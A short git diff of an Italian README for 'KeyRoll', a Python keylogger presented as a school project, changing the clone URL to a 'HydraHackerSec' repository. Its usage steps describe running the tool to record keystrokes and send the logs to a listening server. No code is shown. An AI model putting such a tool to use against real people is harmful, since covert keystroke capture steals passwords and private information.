@@ -23,7 +23,7 @@ KeyRoll è un keylogger sviluppato in Python come parte di un progetto scolastic
 ## Istruzioni per l'Utilizzo
 
 1. Assicurarsi di avere Python 3 installato sul sistema.
-2. Clonare il repository: `git clone https://github.com/tuonome/KeyRoll.git`
+2. Clonare il repository: `git clone https://github.com/HydraHackerSec/KeyRoll.git`
 3. Eseguire il programma: `keyroll.py`
 4. Il keylogger inizierà a registrare la tastiera e salverà i log in un file e lo invierà a un server in ascolto.
 
